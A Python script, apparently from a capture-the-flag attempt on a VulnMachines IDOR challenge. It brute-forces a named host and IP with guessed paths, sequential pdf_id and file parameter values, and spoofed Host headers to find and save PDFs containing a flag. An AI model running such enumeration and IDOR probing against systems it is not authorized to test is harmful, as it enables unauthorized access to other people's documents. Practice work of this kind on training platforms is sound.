#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# Multiple target possibilities
targets = [
    "http://hackme1.vulnmachines.com",
    "http://3.109.47.214",  # Direct IP
    "http://hackme1.vulnmachines.com:80",
    "http://3.109.47.214:80"
]

# Based on VulnMachines patterns
paths = [
    # Direct IDOR paths
    "idor", "IDOR", "Idor",
    "idor/", "IDOR/", "Idor/",
    "idor/index.php", "IDOR/index.php",
    "idor/download.php", "IDOR/download.php",
    "idor/file.php", "IDOR/file.php",
    
    # Mission/Challenge paths
    "missions/idor", "missions/IDOR",
    "mission/idor", "mission/IDOR",
    "challenges/idor", "challenges/IDOR",
    "challenge/idor", "challenge/IDOR",
    "labs/idor", "labs/IDOR",
    "lab/idor", "lab/IDOR",
    
    # VulnMachines specific
    "vulnmachines/idor", "VulnMachines/idor",
    "vnm/idor", "VNM/idor",
    "vm/idor", "VM/idor",
    
    # Download endpoints with pdf_id
    "download.php?pdf_id=1",
    "download.php?pdf_id=2",
    "download.php?pdf_id=3",
    "download.php?pdf_id=4",
    "download.php?pdf_id=5",
    "file.php?pdf_id=1",
    "file.php?pdf_id=2",
    "pdf.php?pdf_id=1",
    "pdf.php?pdf_id=2",
    "get.php?pdf_id=1",
    
    # With ID parameter
    "download.php?id=1",
    "download.php?id=2",
    "download.php?id=3",
    "file.php?id=1",
    "file.php?id=2",
    "pdf.php?id=1",
    
    # Try subdirectories with download
    "idor/download.php?pdf_id=1",
    "idor/download.php?pdf_id=2",
    "IDOR/download.php?pdf_id=1",
    "challenge/download.php?pdf_id=1",
    "lab/download.php?pdf_id=1",
    "mission/download.php?pdf_id=1",
    
    # Try with file parameter
    "download.php?file=1.pdf",
    "download.php?file=2.pdf",
    "download.php?file=file.pdf",
    "download.php?file=document.pdf",
    "download.php?file=idor.pdf",
    "download.php?file=flag.pdf",
    
    # Direct PDF files
    "1.pdf", "2.pdf", "3.pdf",
    "file.pdf", "document.pdf",
    "idor.pdf", "IDOR.pdf",
    "flag.pdf", "secret.pdf",
    "idor/1.pdf", "idor/2.pdf",
    "IDOR/1.pdf", "IDOR/2.pdf"
]

# Also try with different Host headers
host_headers = [
    "hackme1.vulnmachines.com",
    "idor.vulnmachines.com",
    "vulnmachines.com",
    "localhost",
    "127.0.0.1"
]

def test_url(target, path, host_header=None):
    try:
        url = f"{target}/{path}"
        headers = {}
        if host_header:
            headers['Host'] = host_header
            
        response = requests.get(url, headers=headers, timeout=5, allow_redirects=False)
        
        if response.status_code == 200:
            content = response.content
            content_type = response.headers.get('Content-Type', '').lower()
            
            # Check if it's a PDF
            if content[:4] == b'%PDF' or 'application/pdf' in content_type:
                return f"[PDF FOUND!] {url}" + (f" (Host: {host_header})" if host_header else ""), content
            
            # Check for non-Apache content
            elif len(content) != 10918 and b'apache2 ubuntu default' not in content.lower():
                # Check for interesting content
                if any(keyword in content.lower() for keyword in [b'idor', b'pdf', b'download', b'file', b'vnm{', b'flag']):
                    return f"[IDOR Page] {url}" + (f" (Host: {host_header})" if host_header else ""), None
                elif b'<form' in content or b'<input' in content:
                    return f"[Form Page] {url}" + (f" (Host: {host_header})" if host_header else ""), None
                elif len(content) > 1000:
                    return f"[Content] {url} - Size: {len(content)}" + (f" (Host: {host_header})" if host_header else ""), None
                    
        elif response.status_code in [301, 302]:
            location = response.headers.get('Location', '')
            if 'pdf' in location.lower() or 'idor' in location.lower():
                return f"[Redirect] {url} -> {location}", None
                
    except Exception:
        pass
    
    return None, None

print("[*] Final IDOR Challenge Search")
print("[*] Testing multiple targets and host headers")
print("-" * 70)

found_items = []
pdfs_found = []

# Test all combinations
print("\n[*] Testing standard paths...")
for target in targets:
    for path in paths:
        result, content = test_url(target, path)
        if result:
            print(result)
            if content and b'%PDF' in content[:10]:
                pdfs_found.append((result, content))
            else:
                found_items.append(result)

# Test with different Host headers
print("\n[*] Testing with different Host headers...")
for target in targets[:2]:  # Only test main targets
    for host in host_headers:
        for path in paths[:20]:  # Test subset of paths
            result, content = test_url(target, path, host)
            if result and result not in found_items:
                print(result)
                if content and b'%PDF' in content[:10]:
                    pdfs_found.append((result, content))
                else:
                    found_items.append(result)

print("\n" + "=" * 70)

if pdfs_found:
    print(f"\n[!!!] SUCCESS: Found {len(pdfs_found)} PDF(s)!")
    
    for i, (description, content) in enumerate(pdfs_found, 1):
        filename = f"/workspace/final_idor_{i}.pdf"
        with open(filename, 'wb') as f:
            f.write(content)
        
        print(f"\n[+] PDF {i}:")
        print(f"    {description}")
        print(f"    Size: {len(content)} bytes")
        print(f"    Saved to: {filename}")
        
        # Check for flag in PDF
        if b'vnm{' in content.lower():
            print(f"    [!!!] This PDF contains the flag!")
            
    print("\n[*] Analyze the PDFs for the flag!")
    
elif found_items:
    print("\n[+] Found potential IDOR pages:")
    for item in found_items[:10]:
        print(item)
    print("\n[*] Manually investigate these pages for IDOR vulnerabilities")
    
else:
    print("\n[-] No IDOR challenge found")
    print("[*] The challenge might be:")
    print("    1. On the actual VulnMachines platform (requires login)")
    print("    2. On port 7500 (currently not responding)")
    print("    3. Behind authentication")
    print("    4. Using a different subdomain or virtual host")